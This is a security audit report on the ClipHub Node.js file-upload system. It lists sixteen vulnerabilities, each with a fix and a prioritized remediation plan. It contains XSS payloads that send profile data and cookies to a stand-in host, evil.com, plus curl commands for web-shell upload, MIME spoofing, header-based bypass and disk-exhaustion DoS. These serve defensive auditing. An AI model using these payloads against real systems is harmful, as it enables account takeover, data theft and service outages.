# ClipHub File Upload Security Audit Report

**Audited & Fixed by:** Pranjal Yadav
**GitHub:** https://github.com/pranjal2410719/ClipHub
**LinkedIn:** https://www.linkedin.com/in/-pranjal22/
**Date:** 2026-04-05
**Scope:** Node.js + Express + Multer file upload system (server/ and local-server/)

----

## Executive Summary

The ClipHub file upload system has **7 critical**, **5 high**, and **4 medium** severity vulnerabilities. The system is vulnerable to remote code execution, XSS, denial of service, unauthorized file access, and path traversal attacks. The local-server is effectively a wide-open endpoint with no meaningful security controls.

**Current Security Score: 2.5 / 10**

----

## Vulnerability Findings

### CRITICAL SEVERITY

#### VULN-01: Public Static File Serving Bypasses All Download Controls

**Location:** `server/index.js:76`
```javascript
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
```

**Attack:** Anyone who knows or guesses a file's storage path can download it directly via `/uploads/{uuid}-{timestamp}.ext`, completely bypassing:
- Password protection
- Download limits
- Expiration/TTL
- Authentication requirements

**Payload:**
```
GET /uploads/abc123-def456-1234567890.pdf HTTP/1.1
Host: target.com
```

**Impact:** All file access controls (passwords, download limits, expiry) are meaningless. Any file can be accessed directly.

**Fix:** Remove `express.static()` for uploads entirely. Serve files only through the authenticated `downloadFile` controller.

----

#### VULN-02: Dangerous MIME Types Allowed (Code Execution Risk)

**Location:** `server/config/multer.js:38`
```javascript
'application/json', 'application/javascript', 'text/html', 'text/css',
```

**Attack:** Upload an HTML file with embedded JavaScript:
```html
<!-- payload.html -->
<html><body><script>fetch('/api/auth/profile').then(r=>r.json()).then(d=>{
  fetch('https://evil.com/steal?data='+JSON.stringify(d))
})</script></body></html>
```

When accessed via the static file server, this executes in the victim's browser with full access to the ClipHub domain, cookies, and localStorage tokens.

**Impact:** Account takeover via XSS, data exfiltration, CSRF.

**Fix:** Remove ALL executable MIME types from the whitelist. Never allow `text/html`, `application/javascript`, `application/json` as uploadable file types.

----

#### VULN-03: `application/octet-stream` Allows ANY File Type

**Location:** `server/config/multer.js:40`

**Attack:** An attacker can rename ANY file to have a `.bin` extension or set the `Content-Type` header to `application/octet-stream` and upload:
- Executables (`.exe`, `.sh`, `.py`)
- Web shells (`.php`, `.asp`)
- Malware payloads

**Payload:**
```bash
curl -X POST /api/file \
  -H "Authorization: Bearer <token>" \
  -F "file=@malware.exe;type=application/octet-stream" \
  -F "key=innocent-looking"
```

**Impact:** Server becomes a malware distribution platform. If the server ever processes these files (e.g., image processing), remote code execution is possible.

**Fix:** Remove `application/octet-stream` from the whitelist entirely. It is a catch-all that defeats the purpose of MIME type filtering.

----

#### VULN-04: Local Server Has Zero Security Controls

**Location:** `local-server/index.js`

**Issues:**
- No authentication required for any endpoint
- CORS set to `*` (all origins)
- 10GB file size limit (DoS vector)
- No MIME type filtering at all
- Passwords stored in PLAINTEXT (not hashed)
- No rate limiting
- Filenames use `{timestamp}-{originalname}` (predictable, allows path traversal via filename)
- Timeouts disabled (`server.setTimeout(0)`)

**Attack:**
```bash
# Upload any file from any origin, no auth needed
curl -X POST http://target:5001/api/file \
  -F "file=@/etc/passwd;type=text/html" \
  -F "key=stolen-data"
```

**Impact:** Complete system compromise. This server is a wide-open file upload endpoint.

**Fix:** Apply the same security controls as the main server, or restrict to trusted local network only with strict controls.

----

#### VULN-05: No Magic Number / File Signature Validation

**Location:** `server/config/multer.js` and `server/controllers/fileController.js`

**Attack:** Rename a malicious file to appear as an allowed type:
```bash
# Create a file that starts with PNG magic bytes but contains JS
printf '\x89PNG\r\n\x1a\n' > fake.png
cat malicious_script.js >> fake.png
curl -X POST /api/file \
  -H "Authorization: Bearer <token>" \
  -F "file=@fake.png;type=image/png" \
  -F "key=test"
```

Multer only checks the `Content-Type` header, which is client-controlled. An attacker can set `Content-Type: image/png` for any file.

**Impact:** Complete bypass of MIME type filtering. Any file can be uploaded by spoofing the Content-Type header.

**Fix:** Implement server-side magic number validation using `file-type` library to verify the actual file content matches the claimed MIME type.

----

#### VULN-06: Profile Upload Has Predictable Filenames

**Location:** `server/routes/userRoutes.js:24-25`
```javascript
const extension = path.extname(file.originalname);
cb(null, `${req.user._id}-${Date.now()}${extension}`);
```

**Attack:** Given a known user ID and approximate timestamp, an attacker can predict the profile image filename and access it directly via `/uploads/profile/{userId}-{timestamp}.jpg`.

**Impact:** Information disclosure. If combined with VULN-01 (static file serving), profile images are publicly accessible.

**Fix:** Use UUID-based filenames for profile uploads too.

----

#### VULN-07: Rate Limiter Fails Open

**Location:** `server/middleware/rateLimiter.js:28`
```javascript
next(); // Allow request to continue if rate limiter fails
```

**Attack:** If Redis goes down (or the attacker can cause Redis errors), ALL rate limiting is bypassed. An attacker could flood the upload endpoint with large files.

**Impact:** DoS protection completely disabled during Redis outages.

**Fix:** Fail closed for upload endpoints. Use in-memory fallback rate limiting.

----

### HIGH SEVERITY

#### VULN-08: No Upload-Specific Rate Limiting

**Location:** `server/index.js:60`
```javascript
app.use('/api', rateLimiter(60000, 100)); // 100 requests per minute
```

**Attack:** 100 requests per minute is far too generous for file uploads. An attacker can upload 100 x 10MB = 1GB per minute per IP.

```bash
# Rapid fire uploads
for i in {1..100}; do
  curl -X POST /api/file \
    -H "Authorization: Bearer <token>" \
    -F "file=@10mb_file.bin;type=application/octet-stream" \
    -F "key=file$i" &
done
```

**Impact:** Disk exhaustion DoS, bandwidth abuse.

**Fix:** Add separate, stricter rate limiter for upload endpoints (e.g., 10 uploads per minute).

----

#### VULN-09: `x-upload-mode` Header Can Be Spoofed

**Location:** `server/config/multer.js:90`
```javascript
const isForcedLocal = req.headers['x-upload-mode'] === 'local';
```

**Attack:** Any client can set this header to bypass ALL file type and size restrictions:
```bash
curl -X POST /api/file \
  -H "Authorization: Bearer <token>" \
  -H "x-upload-mode: local" \
  -F "file=@massive_malware.exe" \
  -F "key=backdoor"
```

**Impact:** Complete bypass of all upload security controls. 10GB uploads, any file type.

**Fix:** Remove client-controlled mode switching. Determine mode server-side based on request origin/network.

----

#### VULN-10: Original Filename Stored and Returned

**Location:** `server/controllers/fileController.js:57, 95`

**Attack:** Upload a file with XSS payload in the name:
```bash
curl -X POST /api/file \
  -H "Authorization: Bearer <token>" \
  -F 'file=@test.png;filename=<script>alert(1)</script>.png' \
  -F "key=xss-test"
```

The `originalName` is stored in the database and returned in API responses. If rendered without escaping in the frontend, this causes XSS.

**Impact:** Stored XSS via filename.

**Fix:** Sanitize originalName before storage. Never trust client-provided filenames.

----

#### VULN-11: Content-Disposition Header Injection

**Location:** `server/controllers/fileController.js:215`
```javascript
res.setHeader('Content-Disposition', `attachment; filename="${fileRecord.originalName}"`);
```

**Attack:** If `originalName` contains quotes or special characters:
```
filename="; filename="/etc/passwd"; foo="
```

**Impact:** HTTP response header injection, potential CRLF injection.

**Fix:** Sanitize filename in Content-Disposition header. Use RFC 6266 encoding.

----

#### VULN-12: No Upload Logging or Audit Trail

**Location:** Throughout

**Attack:** An attacker can upload malicious files with no detection or logging of:
- Failed upload attempts (reconnaissance)
- Suspicious file types
- Large file uploads
- Rapid upload patterns

**Impact:** No forensic capability. Attacks go undetected.

**Fix:** Implement structured logging for all upload events with suspicious activity detection.

----

### MEDIUM SEVERITY

#### VULN-13: JWT Secret Fallback

**Location:** `server/utils/jwt.js:3`
```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'fallback-secret-key';
```

**Impact:** If `JWT_SECRET` is not set, anyone can forge tokens.

----

#### VULN-14: No WebSocket Authentication

**Location:** `server/config/socket.js`

**Impact:** Anyone can join any clip room, receive real-time data.

----

#### VULN-15: Token in localStorage

**Location:** `client/src/hooks/useAuth.jsx:19`

**Impact:** XSS can steal tokens. HttpOnly cookies are more secure.

----

#### VULN-16: Error Messages Leak Internal Details

**Location:** `server/index.js:127, 136`

**Impact:** File type error messages reveal the MIME type the attacker sent, aiding reconnaissance.

----

## Attack Demonstrations

### Attack 1: Complete Security Bypass via x-upload-mode

```bash
# Bypass ALL restrictions in a single request
curl -X POST http://target:5000/api/file \
  -H "Authorization: Bearer <valid-token>" \
  -H "x-upload-mode: local" \
  -F "file=@webshell.php;type=application/x-php" \
  -F "key=shell"
```

**Result:** File uploaded with no size limit, no type checking.

### Attack 2: XSS via HTML Upload

```bash
curl -X POST http://target:5000/api/file \
  -H "Authorization: Bearer <valid-token>" \
  -F "file=@<script>document.location='https://evil.com/?c='+document.cookie</script>.html;type=text/html" \
  -F "key=xss"

# Then access via static file server:
GET /uploads/{uuid}-timestamp.html
```

**Result:** Script executes in victim's browser when they access the file.

### Attack 3: Disk Exhaustion DoS

```bash
# 100 uploads of 10MB each = 1GB in under a minute
for i in {1..100}; do
  dd if=/dev/zero of=/tmp/pad$i.bin bs=1M count=10
  curl -s -X POST http://target:5000/api/file \
    -H "Authorization: Bearer <token>" \
    -F "file=@/tmp/pad$i.bin;type=application/octet-stream" \
    -F "key=pad$i" &
done
```

**Result:** Server disk fills up, service crashes.

### Attack 4: MIME Spoofing

```bash
# Upload a JavaScript file disguised as PNG
echo 'console.log("malicious");' > evil.js
curl -X POST http://target:5000/api/file \
  -H "Authorization: Bearer <token>" \
  -F "file=@evil.js;type=image/png" \
  -F "key=evil"
```

**Result:** File accepted because multer only checks the client-provided `Content-Type` header.

### Attack 5: Direct File Access

```bash
# Upload a password-protected file
curl -X POST http://target:5000/api/file \
  -H "Authorization: Bearer <token>" \
  -F "file=@secret.pdf;type=application/pdf" \
  -F "key=secret" \
  -F "password=supersecret"

# Bypass password by accessing directly:
GET /uploads/{uuid}-timestamp.pdf
```

**Result:** File downloaded without password, bypassing all access controls.

----

## Risk Mitigation Summary

| Risk | Current State | After Fix |
|------|--------------|-----------|
| XSS via uploaded files | VULNERABLE | MITIGATED |
| Malicious file hosting | VULNERABLE | MITIGATED |
| DoS via large uploads | VULNERABLE | MITIGATED |
| Unauthorized file access | VULNERABLE | MITIGATED |
| MIME type bypass | VULNERABLE | MITIGATED |
| Path traversal | LOW RISK | MITIGATED |
| Rate limit bypass | VULNERABLE | MITIGATED |
| Info disclosure via errors | VULNERABLE | MITIGATED |

----

## Top 3 Remaining Critical Risks (After Fixes)

1. **Client-side file-type detection is inherently unreliable** - Even with magic number validation, sophisticated attackers can craft polyglot files that pass signature checks but contain malicious payloads. Consider server-side virus scanning (ClamAV) for production.

2. **LocalStorage token storage** - Any XSS vulnerability in the frontend can steal JWT tokens. Migration to HttpOnly cookies is recommended but requires frontend changes.

3. **WebSocket authentication gap** - Socket.io connections have no auth middleware. An unauthenticated user can join any room and receive real-time data.

----

## Recommendations (Priority Order)

1. **IMMEDIATE:** Remove `express.static()` for uploads (VULN-01)
2. **IMMEDIATE:** Remove dangerous MIME types from whitelist (VULN-02, VULN-03)
3. **IMMEDIATE:** Remove `x-upload-mode` header bypass (VULN-09)
4. **HIGH:** Implement magic number validation (VULN-05)
5. **HIGH:** Add upload-specific rate limiting (VULN-08)
6. **HIGH:** Fix local-server security (VULN-04)
7. **MEDIUM:** Add upload logging and audit trail (VULN-12)
8. **MEDIUM:** Fix error message information leakage (VULN-16)